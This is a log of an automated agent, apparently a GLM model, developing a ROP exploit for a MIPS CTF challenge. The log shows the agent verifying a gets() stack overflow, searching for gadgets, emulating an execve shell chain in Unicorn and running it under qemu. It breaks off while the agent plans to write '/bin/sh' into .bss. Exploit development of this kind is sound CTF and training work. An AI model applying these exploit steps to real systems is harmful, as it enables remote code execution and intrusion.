13:48:15 [impact:BUG-001]   ← execute(0.1s): --- ⏎ GNU gdb (Ubuntu 15.1-1ubuntu1~24.04.1) 15.1 ⏎ Copyright (C) 2024 Free Software Foundation, Inc. ⏎ License GPLv3+: GNU GPL version 3 or later <ht...(348 chars)
13:48:15 [impact:BUG-001] → 调用 GLM...
13:48:18 [impact:BUG-001] ← GLM(3.8s): 调工具[execute, execute]
13:48:18 [impact:BUG-001] GDB 不支持 MIPS 架构。让我检查一下是否有支持 MIPS 的 gdb-multiarch，并尝试使用 qemu-user 进行动态测试。
13:48:18 [impact:BUG-001]   → 工具 execute({"command": "apt list --installed 2>/dev/null | grep -i -E \"gdb-multi|qemu\" ; which gdb-multiarch 2>/dev/null; find /usr -name \"gdb*\" -type f 2>/d)
13:48:18 [impact:BUG-001]   → 工具 execute({"command": "# Try to find any MIPS emulator\nfind / -name \"qemu-mips*\" -type f 2>/dev/null; find / -name \"*mips*emul*\" -type f 2>/dev/null; pytho)
13:48:21 [impact:BUG-001]   ← execute(2.6s): /usr/bin/gdb ⏎ /usr/bin/gdbtui ⏎ /usr/bin/gdb-add-index ⏎ /usr/bin/gdbus ⏎ /usr/share/bash-completion/completions/gdbus ⏎ /usr/share/gdb/syscalls/gdb-...(393 chars)
13:48:24 [impact:BUG-001]   ← execute(5.6s): unicorn available ⏎  ⏎ Exit code: 1 ⏎ [Command failed with exit code 1]
13:48:24 [impact:BUG-001] → 调用 GLM...
13:48:29 [impact:BUG-001] ← GLM(4.9s): 调工具[execute]
13:48:29 [impact:BUG-001] Unicorn engine 可用！这是一个 CPU 模拟器，可以模拟 MIPS 代码。我可以使用它来动态验证该原语。让我编写一个验证脚本，使用 Unicorn 来模拟 `main` 函数的执行，并验证栈溢出是否覆盖了保存的 `ra`，从而导致控制流劫持。
13:48:29 [impact:BUG-001]   → 工具 execute({"command": "python3 -c \"import unicorn; from unicorn import *; from unicorn.mips_const import *; print('Unicorn MIPS constants available'); print(di)
13:48:29 [impact:BUG-001]   ← execute(0.1s): Unicorn MIPS constants available ⏎ ['__abs__', '__add__', '__and__', '__bool__', '__ceil__', '__class__', '__delattr__', '__dir__', '__divmod__', '__d...(1055 chars)
13:48:29 [impact:BUG-001] → 调用 GLM...
13:49:32 [impact:BUG-001] ← GLM(63.1s): 调工具[write_file]
13:49:32 [impact:BUG-001] Unicorn 支持 MIPS32 大端序。现在让我编写验证 PoC。我将使用 Unicorn 来模拟： 1. 加载二进制文件的代码段 2. 设置栈 3. 使用溢出 payload 执行 `main` 函数 4. 验证 `saved ra` 是否被覆盖，以及 `jr $ra` 是否跳转到了攻击者控制
13:49:32 [impact:BUG-001]   → 工具 write_file({"content": "#!/usr/bin/env python3\n\"\"\"\nPrimitive Verification PoC for BUG-001: STACK_BUFFER_OVERFLOW_UNBOUNDED_GETS\n\nThis PoC verifies the fol)
13:49:32 [impact:BUG-001]   ← write_file(0.0s): Updated file /work/workspace/0024-2023-51-mips-rop-20260909-134236/poc-BUG-001.py
13:49:32 [impact:BUG-001] → 调用 GLM...
13:49:34 [impact:BUG-001] ← GLM(2.0s): 调工具[run_script]
13:49:34 [impact:BUG-001]   → 工具 run_script({"path": "/work/workspace/0024-2023-51-mips-rop-20260909-134236/poc-BUG-001.py", "timeout": 30})
13:49:34 [impact:BUG-001]   ← run_script(0.1s): rc=0 ⏎ --- stdout (summarized) --- ⏎ ====================================================================== ⏎ BUG-001: STACK_BUFFER_OVERFLOW_UNBOUNDED...(2496 chars)
13:49:34 [impact:BUG-001] → 调用 GLM...
13:49:49 [impact:BUG-001] ← GLM(14.9s): 调工具[execute]
13:49:49 [impact:BUG-001] 三个原语均已通过动态证据验证。让我分析一下测试 2 的结果（正好 76 字节）——它显示 `0x00adbeef`，这意味着第 76 个字节部分覆盖了 `ra` 的最高字节。这是合理的：76 字节正好到达 `ra` 的起始位置，而 `gets` 会添加一个空字节终止符，该终止符覆盖了 `ra` 的第
13:49:49 [impact:BUG-001]   → 工具 execute({"command": "python3 << 'PYEOF'\n# Verify: main does NOT reference __stack_chk_guard (0x490958)\n# Check if main's code contains any reference to 0x49)
13:49:49 [impact:BUG-001]   ← execute(0.0s): GNU_STACK segment present: False ⏎ NX status: DISABLED (no GNU_STACK) ⏎ Executable LOAD segment: LOAD           0x000000 0x00400000 0x00400000 0x7dd84...(841 chars)
13:49:49 [impact:BUG-001] → 调用 GLM...
13:49:53 [impact:BUG-001] ← GLM(3.7s): 调工具[read_file]
13:49:53 [impact:BUG-001] 所有缓解措施已确认。现在让我验证溢出是否也提供了超出 `ra` 的额外栈控制（用于 ROP 链），并确认溢出可以写入栈上 `ra` 之后的任意数据。让我添加一个测试来验证更广泛的栈控制。
13:49:53 [impact:BUG-001]   → 工具 read_file({"file_path": "/work/workspace/0024-2023-51-mips-rop-20260909-134236/poc-BUG-001.py", "limit": 20, "offset": 0})
13:49:53 [impact:BUG-001]   ← read_file(0.0s):  1  #!/usr/bin/env python3 ⏎  2  """ ⏎  3  Primitive Verification PoC for BUG-001: STACK_BUFFER_OVERFLOW_UNBOUNDED_GETS ⏎  4   ⏎  5  This PoC verifies...(1077 chars)
13:49:53 [impact:BUG-001] → 调用 GLM...
13:50:08 [impact:BUG-001] ← GLM(15.1s): 调工具[edit_file]
13:50:08 [impact:BUG-001] PoC 运行良好。现在让我验证一下溢出是否提供了超出 `ra` 的额外栈控制（这对于 ROP 链至关重要）。让我添加一个 PRIM-004 测试，用于验证对 `ra` 之后的栈内容的控制。
13:50:08 [impact:BUG-001]   → 工具 edit_file({"file_path": "/work/workspace/0024-2023-51-mips-rop-20260909-134236/poc-BUG-001.py", "new_string": "def verify_prim004_extended_stack_control():\n   )
13:50:08 [impact:BUG-001]   ← edit_file(0.0s): Successfully replaced 1 instance(s) of the string in '/work/workspace/0024-2023-51-mips-rop-20260909-134236/poc-BUG-001.py'
13:50:08 [impact:BUG-001] → 调用 GLM...
13:50:10 [impact:BUG-001] ← GLM(2.4s): 调工具[run_script]
13:50:10 [impact:BUG-001]   → 工具 run_script({"path": "/work/workspace/0024-2023-51-mips-rop-20260909-134236/poc-BUG-001.py", "timeout": 30})
13:50:10 [impact:BUG-001]   ← run_script(0.1s): rc=0 ⏎ --- stdout (summarized) --- ⏎ ====================================================================== ⏎ BUG-001: STACK_BUFFER_OVERFLOW_UNBOUNDED...(3170 chars)
13:50:10 [impact:BUG-001] → 调用 GLM...
13:50:15 [impact:BUG-001] ← GLM(4.8s): 调工具[execute]
13:50:15 [impact:BUG-001] 四个原语均已通过动态证据验证。现在让我整合分析结果。根据合并规则（第十一章），PRIM-001、PRIM-003 和 PRIM-004 均为 STACK_CONTROL 类型，且具有相同的前提条件和相同的源 BUG。它们应当被合并为一个 STACK_CONTROL 原语。PRIM-002 是 RIP
13:50:15 [impact:BUG-001]   → 工具 execute({"command": "ls -la /work/workspace/0024-2023-51-mips-rop-20260909-134236/poc-BUG-001.py; wc -l /work/workspace/0024-2023-51-mips-rop-20260909-134236/)
13:50:15 [impact:BUG-001]   ← execute(0.0s): -rwxrwxrwx 1 ubuntu ubuntu 18950 Sep  9 13:50 /work/workspace/0024-2023-51-mips-rop-20260909-134236/poc-BUG-001.py ⏎ 446 /work/workspace/0024-2023-51-...(231 chars)
13:50:15 [impact:BUG-001] → 调用 GLM...
13:51:31 [impact:BUG-001] ← GLM(75.6s): 调工具[submit_final_result]
13:51:31 [impact:BUG-001] PoC 文件已就绪并可复现。现在让我来汇总最终分析：  **分析总结：**  1. **BUG-001**: 通过 `gets` 导致的栈缓冲区溢出 — `main` 函数在 0x40082c 处调用 `gets(fp+0x18)` 且没有边界检查。缓冲区到保存的 `ra` 的距离为 76 字节。 
13:51:31 [impact:BUG-001] ✓ submit_final_result 收到最终报告（PrimitiveReport 校验通过，19914 chars）
13:51:31 [impact:BUG-001] → 调用 GLM...
13:51:43 [impact:BUG-001] ← GLM(12.5s)
13:51:43 [impact:BUG-001] S3 Primitive 分析与验证已完成。以下是工作总结：  ## BUG-001: STACK_BUFFER_OVERFLOW_UNBOUNDED_GETS  ### 已验证原语 (Primitives)  **PRIM-001: STACK_CONTROL (已验证, 直接)** - `mai
13:51:43 [stage3] 保存 → /work/workspace/0024-2023-51-mips-rop-20260909-134236/stage3.json
13:51:43 --- S4 Exploit ---
13:51:43 === exploit (bug_id=-) ===
13:51:44 [exploit] → 调用 GLM...
13:51:50 [exploit] ← GLM(6.0s): 调工具[read_file]
13:51:50 [exploit] # S4 Exploit 路线规划与利用生成  ## 第一步：分析场景并加载匹配的 Skill  **场景分析：** - 架构：MIPS32 big-endian, 32-bit, 静态链接 - Mitigations：NX disabled, No PIE, No Canary (main), P
13:51:50 [exploit]   → 工具 read_file({"file_path": "/work/leanagent/skills/rop-ret2libc/SKILL.md", "limit": 1000})
13:51:50 [exploit]   ← read_file(0.0s):  1  --- ⏎  2  name: rop-ret2libc ⏎  3  description: 栈溢出→RIP Control→ROP链/ret2libc/SROP拿shell。通用方法论。 ⏎  4  --- ⏎  5   ⏎  6  # ROP / ret2libc / SROP ⏎  ...(1300 chars)
13:51:50 [exploit] → 调用 GLM...
13:51:55 [exploit] ← GLM(5.7s): 调工具[disassemble, disassemble]
13:51:55 [exploit] Skill 已加载。现在让我理解这个 MIPS 场景的特殊性：  **关键差异分析（MIPS vs x86）：** 1. MIPS o32 ABI：参数在 `$a0-$a3`，syscall 号在 `$v0`，不是 x86 的 `rdi/rsi/rdx` 2. MIPS ROP 用 ret2csu（
13:51:55 [exploit]   → 工具 disassemble({"binary": "/work/workspace/0024-2023-51-mips-rop-20260909-134236/target", "function": "__libc_csu_init", "lines": 80})
13:51:55 [exploit]   → 工具 disassemble({"binary": "/work/workspace/0024-2023-51-mips-rop-20260909-134236/target", "function": "main", "lines": 40})
13:51:55 [exploit]   ← disassemble(0.0s): [stderr] objdump: can't disassemble for architecture UNKNOWN!
13:51:55 [exploit]   ← disassemble(0.0s): [stderr] objdump: can't disassemble for architecture UNKNOWN!
13:51:55 [exploit] → 调用 GLM...
13:52:00 [exploit] ← GLM(4.9s): 调工具[search_rop_gadgets, search_rop_gadgets]
13:52:00 [exploit] objdump 不支持 MIPS 架构。让我用 gdb 或其他方式查看。先用 S1 已提供的反汇编信息来分析，同时搜索关键 gadget。
13:52:00 [exploit]   → 工具 search_rop_gadgets({"binary": "/work/workspace/0024-2023-51-mips-rop-20260909-134236/target", "keyword": "syscall", "max_results": 20})
13:52:00 [exploit]   → 工具 search_rop_gadgets({"binary": "/work/workspace/0024-2023-51-mips-rop-20260909-134236/target", "keyword": "jr $ra", "max_results": 30})
13:52:01 [exploit]   ← search_rop_gadgets(0.3s): 0x0041b6e8 : addiu $a0, $a0, -0x10 ; move $a3, $t0 ; lw $t0, 0xc($v1) ; srlv $a3, $a3, $t3 ; sw $v0, 0xc($a0) ; sllv $v0, $t0, $a1 ; b 0x41b69c ; or $...(4997 chars)
13:52:01 [exploit]   ← search_rop_gadgets(0.4s): 0x004176bc : addiu $a0, $a0, 0x2d38 ; addiu $a2, $zero, 1 ; move $a3, $zero ; addiu $v0, $zero, 0x108e ; syscall ⏎ 0x00413c4c : addiu $a0, $a0, 0x5e54...(2911 chars)
13:52:01 [exploit] → 调用 GLM...
13:52:06 [exploit] ← GLM(5.1s): 调工具[gdb_run]
13:52:06 [exploit] 好的，我看到了 syscall gadget。现在让我搜索更精确的 gadget — 特别是 ret2csu 的 epilogue 和 syscall gadget 的精确指令序列。S1 已经提供了这些信息，让我用 gdb 来验证。
13:52:06 [exploit]   → 工具 gdb_run({"binary": "/work/workspace/0024-2023-51-mips-rop-20260909-134236/target", "commands": "set architecture mips; file /work/workspace/0024-2023-51-mips-)
13:52:06 [exploit]   ← gdb_run(0.1s):    0x4010c4 <__libc_csu_init+196>:	(bad) ⏎    0x4010c5 <__libc_csu_init+197>:	mov    $0xb58f3400,%edi ⏎    0x4010ca <__libc_csu_init+202>:	add    %dh,...(2902 chars)
13:52:06 [exploit] → 调用 GLM...
13:52:11 [exploit] ← GLM(4.8s): 调工具[execute, execute]
13:52:11 [exploit] GDB 在 x86 主机上无法正确反汇编 MIPS 代码（显示为 x86 指令）。但 S1 已经提供了精确的反汇编信息。让我用 Python 来读取二进制字节并用 capstone 或手动验证关键 gadget。让我先检查是否有 qemu-mips 可用来运行二进制。
13:52:11 [exploit]   → 工具 execute({"command": "which qemu-mips qemu-mips-static 2>/dev/null; ls /usr/bin/qemu-mips* 2>/dev/null; dpkg -l | grep qemu 2>/dev/null | head -5"})
13:52:11 [exploit]   → 工具 execute({"command": "python3 -c \"import capstone; print('capstone available')\" 2>/dev/null; python3 -c \"from pwn import *; print('pwntools available')\" 2>)
13:52:11 [exploit]   ← execute(0.0s): 【已被工具层拦截】禁止用 execute 跑内联 `python -c` 里的 pwntools 交互（recv 无 timeout → stdin 死锁 → 烧墙钟）。改用：① run_binary(stdin=, timeout=10)；② write_file 完整脚本（内部 recv 必带 ...(189 chars)
13:52:11 [exploit]   ← execute(0.0s): <no output> ⏎ [Command succeeded with exit code 0]
13:52:11 [exploit] → 调用 GLM...
13:52:14 [exploit] ← GLM(3.3s): 调工具[execute]
13:52:14 [exploit] 没有 qemu-mips。让我检查 capstone 是否可用，并尝试用 pwntools 的 disasm 功能。
13:52:14 [exploit]   → 工具 execute({"command": "python3 -c \"import capstone; print('capstone available')\" 2>/dev/null || echo \"no capstone\"; python3 -c \"from pwn import *; e=ELF('/)
13:52:14 [exploit]   ← execute(0.0s): 【已被工具层拦截】禁止用 execute 跑内联 `python -c` 里的 pwntools 交互（recv 无 timeout → stdin 死锁 → 烧墙钟）。改用：① run_binary(stdin=, timeout=10)；② write_file 完整脚本（内部 recv 必带 ...(189 chars)
13:52:14 [exploit] → 调用 GLM...
13:52:30 [exploit] ← GLM(16.3s): 调工具[write_file]
13:52:30 [exploit] 让我写一个脚本来检查环境并反汇编关键 gadget。
13:52:30 [exploit]   → 工具 write_file({"content": "#!/usr/bin/env python3\n\"\"\"Check environment and disassemble key MIPS gadgets.\"\"\"\nimport struct\n\nBINARY = \"/work/workspace/0024)
13:52:30 [exploit]   ← write_file(0.0s): Updated file /work/workspace/0024-2023-51-mips-rop-20260909-134236/check_env.py
13:52:30 [exploit] → 调用 GLM...
13:52:34 [exploit] ← GLM(3.8s): 调工具[run_script]
13:52:34 [exploit]   → 工具 run_script({"path": "/work/workspace/0024-2023-51-mips-rop-20260909-134236/check_env.py", "timeout": 15})
13:52:34 [exploit]   ← run_script(0.2s): rc=1 ⏎ --- stdout (summarized) --- ⏎ [+] capstone available ⏎  ⏎ === ret2csu epilogue @ 0x4010c4 === ⏎   0x004010c4: lw	$ra, 0x34($sp) ⏎   0x004010c8:...(3147 chars)
13:52:34 [exploit] → 调用 GLM...
13:53:09 [exploit] ← GLM(35.2s): 调工具[write_file]
13:53:09 [exploit] Capstone 可用且成功反汇编了所有关键 gadget。现在让我分析完整的利用链：  **关键发现：**  1. **ret2csu epilogue @ 0x4010c4:**    - `lw $ra, 0x34($sp)` — 从 sp+0x34 加载 ra    - `lw $s5, 0
13:53:09 [exploit]   → 工具 write_file({"content": "#!/usr/bin/env python3\n\"\"\"Search for useful MIPS ROP gadgets using capstone.\"\"\"\nfrom capstone import *\nimport struct\n\nBINARY =)
13:53:09 [exploit]   ← write_file(0.0s): Updated file /work/workspace/0024-2023-51-mips-rop-20260909-134236/find_gadgets.py
13:53:09 [exploit] → 调用 GLM...
13:53:13 [exploit] ← GLM(3.8s): 调工具[run_script]
13:53:13 [exploit]   → 工具 run_script({"path": "/work/workspace/0024-2023-51-mips-rop-20260909-134236/find_gadgets.py", "timeout": 30})
13:53:13 [exploit]   ← run_script(0.1s): rc=0 ⏎ --- stdout (summarized) --- ⏎ [+] Found 1036 jr $ra gadgets ⏎  ⏎ === move_a0_from_s (3 found) === ⏎   0x0040b1c8: jalr $t9; move $a0, $s1; subu...(3140 chars)
13:53:13 [exploit] → 调用 GLM...
13:54:32 [exploit] ← GLM(78.6s): 调工具[write_file]
13:54:32 [exploit] 非常好！我找到了关键 gadget。让我分析最重要的几个：  1. **`set_a0_a1` gadget @ 0x00461174:** `lw $a3, 0xdfc($sp); lw $a2, 0xdf8($sp); lw $a1, 0xdf4($sp); lw $a0, 0xdf0($sp)
13:54:32 [exploit]   → 工具 write_file({"content": "#!/usr/bin/env python3\n\"\"\"Search for specific MIPS ROP gadgets for execve chain.\"\"\"\nfrom capstone import *\nimport struct\n\nBINA)
13:54:32 [exploit]   ← write_file(0.0s): Updated file /work/workspace/0024-2023-51-mips-rop-20260909-134236/find_gadgets2.py
13:54:32 [exploit] → 调用 GLM...
13:54:36 [exploit] ← GLM(3.8s): 调工具[run_script]
13:54:36 [exploit]   → 工具 run_script({"path": "/work/workspace/0024-2023-51-mips-rop-20260909-134236/find_gadgets2.py", "timeout": 30})
13:54:36 [exploit]   ← run_script(0.1s): rc=0 ⏎ --- stdout (summarized) --- ⏎ === main epilogue (0x400840-0x400850) === ⏎   0x00400840: lw	$ra, 0x64($sp) ⏎   0x00400844: lw	$fp, 0x60($sp) ⏎  ...(3229 chars)
13:54:36 [exploit] → 调用 GLM...
13:55:28 [exploit] ← GLM(51.8s): 调工具[write_file]
13:55:28 [exploit] 太好了！关键发现：  1. **0x0041f340 (syscall gadget 地址) 在二进制中找到了 3 处：**    - 0x0047c838    - 0x00484f20    - 0x0048c8b4     这意味着 ret2csu 的 `lw $t9, ($s0)` 中，s0
13:55:28 [exploit]   → 工具 write_file({"content": "#!/usr/bin/env python3\n\"\"\"Verify string addresses and construct the ROP chain.\"\"\"\nfrom capstone import *\nimport struct\n\nBINARY)
13:55:28 [exploit]   ← write_file(0.0s): Updated file /work/workspace/0024-2023-51-mips-rop-20260909-134236/build_rop.py
13:55:28 [exploit] → 调用 GLM...
13:55:30 [exploit] ← GLM(1.8s): 调工具[run_script]
13:55:30 [exploit]   → 工具 run_script({"path": "/work/workspace/0024-2023-51-mips-rop-20260909-134236/build_rop.py", "timeout": 15})
13:55:30 [exploit]   ← run_script(0.1s): rc=0 ⏎ --- stdout (summarized) --- ⏎ [+] String at 0x477504: b'sh\x00\x00chec' (hex: 7368000063686563) ⏎ [+] Value at 0x47c838: 0x0041f340 (expected 0...(3219 chars)
13:55:30 [exploit] → 调用 GLM...
13:56:02 [exploit] ← GLM(32.4s): 调工具[write_file]
13:56:02 [exploit] Payload 构建成功，没有换行符（0x0a），null 字节对 gets() 来说没问题（gets 读取直到换行或 EOF，中间的 null 字节会被正常写入）。  现在让我验证 ROP 链的正确性。关键验证点： 1. "sh\x00" 在 0x477504 ✓ 2. 0x41f340 (sys
13:56:02 [exploit]   → 工具 write_file({"content": "#!/usr/bin/env python3\n\"\"\"\nVerify the ROP chain using Unicorn MIPS32 BE emulation.\nSimulate main's epilogue and the ROP chain to co)
13:56:02 [exploit]   ← write_file(0.0s): Updated file /work/workspace/0024-2023-51-mips-rop-20260909-134236/verify_rop.py
13:56:02 [exploit] → 调用 GLM...
13:56:04 [exploit] ← GLM(2.2s): 调工具[run_script]
13:56:04 [exploit]   → 工具 run_script({"path": "/work/workspace/0024-2023-51-mips-rop-20260909-134236/verify_rop.py", "timeout": 30})
13:56:04 [exploit]   ← run_script(0.1s): rc=0 ⏎ --- stdout (summarized) --- ⏎ === Starting ROP chain emulation from CSU epilogue === ⏎   sp = 0x7f0fee68 ⏎   ra = 0x004010c4 ⏎   gp = 0x0049a2b...(1232 chars)
13:56:04 [exploit] → 调用 GLM...
13:56:59 [exploit] ← GLM(54.9s): 调工具[write_file]
13:56:59 [exploit] ROP 链验证成功！Unicorn 模拟显示：  1. **CSU epilogue** 正确加载 s0-s5 和 ra 2. **CSU call loop** 正确设置 a0="sh"地址, a1=0, a2=0 3. **Syscall gadget** 正确从栈加载 v0=0xfab (ex
13:56:59 [exploit]   → 工具 write_file({"content": "#!/usr/bin/env python3\n\"\"\"\nS4 Exploit: MIPS32 BE ROP via gets() stack buffer overflow\nTarget: hkcertCTF 2023 - MIPS ROP challenge\n)
13:56:59 [exploit]   ← write_file(0.0s): Updated file /work/workspace/0024-2023-51-mips-rop-20260909-134236/exploit.py
13:56:59 [exploit] → 调用 GLM...
13:57:03 [exploit] ← GLM(4.0s): 调工具[run_script]
13:57:03 [exploit]   → 工具 run_script({"path": "/work/workspace/0024-2023-51-mips-rop-20260909-134236/exploit.py", "timeout": 30})
13:57:03 [exploit]   ← run_script(0.0s): rc=1 ⏎ --- stdout (summarized) --- ⏎ (empty) ⏎ --- stderr (summarized) --- ⏎   File "/work/workspace/0024-2023-51-mips-rop-20260909-134236/exploit.py"...(269 chars)
13:57:03 [exploit] → 调用 GLM...
13:57:11 [exploit] ← GLM(7.7s): 调工具[edit_file]
13:57:11 [exploit] 需要修复 `from unicorn import *` 不能在函数内部使用的问题。
13:57:11 [exploit]   → 工具 edit_file({"file_path": "/work/workspace/0024-2023-51-mips-rop-20260909-134236/exploit.py", "new_string": "from pwn import *\nimport struct\nimport sys\n\n# Uni)
13:57:11 [exploit]   ← edit_file(0.0s): Successfully replaced 1 instance(s) of the string in '/work/workspace/0024-2023-51-mips-rop-20260909-134236/exploit.py'
13:57:11 [exploit] → 调用 GLM...
13:57:16 [exploit] ← GLM(5.1s): 调工具[edit_file]
13:57:16 [exploit]   → 工具 edit_file({"file_path": "/work/workspace/0024-2023-51-mips-rop-20260909-134236/exploit.py", "new_string": "    try:\n        from unicorn import Uc, UC_HOOK_COD)
13:57:16 [exploit]   ← edit_file(0.0s): Successfully replaced 1 instance(s) of the string in '/work/workspace/0024-2023-51-mips-rop-20260909-134236/exploit.py'
13:57:16 [exploit] → 调用 GLM...
13:57:20 [exploit] ← GLM(3.5s): 调工具[run_script]
13:57:20 [exploit]   → 工具 run_script({"path": "/work/workspace/0024-2023-51-mips-rop-20260909-134236/exploit.py", "timeout": 30})
13:57:20 [exploit]   ← run_script(0.2s): rc=0 ⏎ --- stdout (summarized) --- ⏎ [+] Payload OK: 160 bytes, no newline bytes ⏎ [*] Verifying ROP chain with Unicorn emulation... ⏎ [*] Unicorn: sy...(1108 chars)
13:57:20 [exploit] → 调用 GLM...
13:57:24 [exploit] ← GLM(4.2s): 调工具[execute]
13:57:24 [exploit] ROP 链通过 Unicorn 验证成功。现在让我尝试安装 qemu-mips 来实际运行 exploit。
13:57:24 [exploit]   → 工具 execute({"command": "apt-get install -y qemu-user 2>/dev/null | tail -5; which qemu-mips qemu-mips-static 2>/dev/null", "timeout": "30"})
13:57:31 [exploit]   ← execute(6.8s): Preparing to unpack .../qemu-user-binfmt_1%3a8.2.2+ds-0ubuntu1.18_amd64.deb ... ⏎ Unpacking qemu-user-binfmt (1:8.2.2+ds-0ubuntu1.18) ... ⏎ Setting up...(381 chars)
13:57:31 [exploit] → 调用 GLM...
13:57:33 [exploit] ← GLM(2.5s): 调工具[run_script]
13:57:33 [exploit] qemu-mips 安装成功！现在让我运行 exploit。
13:57:33 [exploit]   → 工具 run_script({"path": "/work/workspace/0024-2023-51-mips-rop-20260909-134236/exploit.py", "timeout": 30})
13:57:34 [exploit]   ← run_script(0.7s): rc=1 ⏎ --- stdout (summarized) --- ⏎ [+] Payload OK: 160 bytes, no newline bytes ⏎ [*] Verifying ROP chain with Unicorn emulation... ⏎ [*] Unicorn: sy...(2123 chars)
13:57:34 [exploit] → 调用 GLM...
13:57:40 [exploit] ← GLM(5.5s): 调工具[write_file]
13:57:40 [exploit] 进程以 SIGBUS 退出。这可能是 MIPS 的对齐问题或 execve("sh") 的问题。让我用 gdb 调试来查看发生了什么。
13:57:40 [exploit]   → 工具 write_file({"content": "#!/usr/bin/env python3\n\"\"\"\nDebug the ROP chain execution with qemu-mips + strace to see what happens.\n\"\"\"\nimport subprocess\nim)
13:57:40 [exploit]   ← write_file(0.0s): Updated file /work/workspace/0024-2023-51-mips-rop-20260909-134236/debug_strace.py
13:57:40 [exploit] → 调用 GLM...
13:57:42 [exploit] ← GLM(2.5s): 调工具[run_script]
13:57:42 [exploit]   → 工具 run_script({"path": "/work/workspace/0024-2023-51-mips-rop-20260909-134236/debug_strace.py", "timeout": 15})
13:57:43 [exploit]   ← run_script(0.5s): rc=0 ⏎ --- stdout (summarized) --- ⏎ === Running with strace === ⏎ Return code: -7 ⏎ Stdout: b'Welcome to hkcertCTF 2023\ninput : \n' ⏎ Stderr (strace...(689 chars)
13:57:43 [exploit] → 调用 GLM...
13:57:48 [exploit] ← GLM(5.1s): 调工具[list_strings, list_strings]
13:57:48 [exploit] 关键发现！strace 显示：  ``` execve("sh",{) = -1 errno=2 (No such file or directory) ```  execve 被成功调用了！但 "sh" 找不到——因为 `execve("sh", NULL, NULL)` 中的 "sh" 不是完整
13:57:48 [exploit]   → 工具 list_strings({"binary": "/work/workspace/0024-2023-51-mips-rop-20260909-134236/target", "filter": "/bin/sh", "max_lines": 20})
13:57:48 [exploit]   → 工具 list_strings({"binary": "/work/workspace/0024-2023-51-mips-rop-20260909-134236/target", "filter": "/bin", "max_lines": 30})
13:57:48 [exploit]   ← list_strings(0.0s): <no output>
13:57:48 [exploit]   ← list_strings(0.0s): <no output>
13:57:48 [exploit] → 调用 GLM...
13:57:50 [exploit] ← GLM(2.2s): 调工具[list_strings]
13:57:50 [exploit] 没有 "/bin/sh" 字符串。让我搜索 "sh" 字符串和 "/bin" 相关的字符串。
13:57:50 [exploit]   → 工具 list_strings({"binary": "/work/workspace/0024-2023-51-mips-rop-20260909-134236/target", "filter": "sh", "max_lines": 30})
13:57:50 [exploit]   ← list_strings(0.0s): /usr/share/locale ⏎ /usr/share/locale-langpack ⏎ stack smashing detected ⏎ glibc.malloc.trim_threshold ⏎ MALLOC_TRIM_THRESHOLD_ ⏎ glibc.malloc.mmap_th...(986 chars)
13:57:50 [exploit] → 调用 GLM...
13:58:07 [exploit] ← GLM(17.4s): 调工具[write_file]
13:58:07 [exploit] 没有 "/bin/sh"。但 execve("sh", NULL, NULL) 失败是因为 "sh" 不是完整路径。我需要：  1. **方案 A**: 在栈上写入 "/bin/sh\x00" 字符串，然后传给 execve 2. **方案 B**: 使用 ROP 链先调用 read() 从 std
13:58:07 [exploit]   → 工具 write_file({"content": "#!/usr/bin/env python3\n\"\"\"\nSearch for /bin/sh or similar strings, and check if we can write to .bss\n\"\"\"\nfrom pwn import *\n\ne )
13:58:07 [exploit]   ← write_file(0.0s): Updated file /work/workspace/0024-2023-51-mips-rop-20260909-134236/find_shell.py
13:58:07 [exploit] → 调用 GLM...
13:58:11 [exploit] ← GLM(3.2s): 调工具[run_script]
13:58:11 [exploit]   → 工具 run_script({"path": "/work/workspace/0024-2023-51-mips-rop-20260909-134236/find_shell.py", "timeout": 15})
13:58:11 [exploit]   ← run_script(0.2s): rc=0 ⏎ --- stdout (summarized) --- ⏎ [*] '/work/workspace/0024-2023-51-mips-rop-20260909-134236/target' ⏎     Arch:       mips-32-big ⏎     RELRO:    ...(751 chars)
13:58:11 [exploit] → 调用 GLM...
13:58:24 [exploit] ← GLM(12.9s): 调工具[write_file]
13:58:24 [exploit] 好的，没有 "/bin/sh" 字符串。我需要用 ROP 链先将 "/bin/sh\x00" 写入 .bss（0x492790），然后调用 execve。  **新策略：两阶段 ROP 链** 1. 第一阶段：调用 `read(0, bss_addr, 8)` — 从 stdin 读取 "/bin/
13:58:24 [exploit]   → 工具 write_file({"content": "#!/usr/bin/env python3\n\"\"\"\nDisassemble the code after csu loop to understand the full control flow.\n\"\"\"\nfrom capstone import *\)
13:58:24 [exploit]   ← write_file(0.0s): Updated file /work/workspace/0024-2023-51-mips-rop-20260909-134236/analyze_csu.py
13:58:24 [exploit] → 调用 GLM...
13:58:26 [exploit] ← GLM(2.5s): 调工具[run_script]
13:58:26 [exploit]   → 工具 run_script({"path": "/work/workspace/0024-2023-51-mips-rop-20260909-134236/analyze_csu.py", "timeout": 15})
13:58:26 [exploit]   ← run_script(0.1s): rc=0 ⏎ --- stdout (summarized) --- ⏎ === __libc_csu_init full (0x401000-0x4010e8) === ⏎   0x00401000: addiu	$sp, $sp, -0x38 ⏎   0x00401004: lui	$gp, 0...(3279 chars)
13:58:26 [exploit] → 调用 GLM...
13:59:04 [exploit] ← GLM(37.6s): 调工具[write_file]
13:59:04 [exploit] 现在我理解了完整的控制流。关键问题：  **csu loop 之后的代码路径（当 s5 == s1，即只调用一次时）：** ``` 0x401070: addiu $s0, $s0, 4      # s0 += 4 0x401074: bne $s5, $s1, 0x401058 # 如果 s5 
13:59:04 [exploit]   → 工具 write_file({"content": "#!/usr/bin/env python3\n\"\"\"\nSearch for gadgets that set a0/a1/a2 from stack or registers and then jr $ra.\nWe need to set a0, a1, a2 )
13:59:04 [exploit]   ← write_file(0.0s): Updated file /work/workspace/0024-2023-51-mips-rop-20260909-134236/find_better_gadgets.py
13:59:04 [exploit] → 调用 GLM...
13:59:07 [exploit] ← GLM(3.5s): 调工具[run_script]
13:59:07 [exploit]   → 工具 run_script({"path": "/work/workspace/0024-2023-51-mips-rop-20260909-134236/find_better_gadgets.py", "timeout": 60})
13:59:08 [exploit]   ← run_script(0.3s): rc=0 ⏎ --- stdout (summarized) --- ⏎ Total instructions in .text: 82609 ⏎  ⏎ === Gadgets: lw $a0, X($sp) ... jr $ra (41 found) === ⏎   0x0045019c (6 i...(3131 chars)
13:59:08 [exploit] → 调用 GLM...
13:59:58 [exploit] ← GLM(50.4s): 调工具[write_file]
13:59:58 [exploit] 太好了！我找到了一些有用的 gadget。让我分析最简单的：  **最佳候选：0x0043e640** ``` move $a0, $s0; addiu $v0, $zero, 1; lw $ra, 0x1c($sp); lw $s0, 0x18($sp); jr $ra; addiu $sp, $
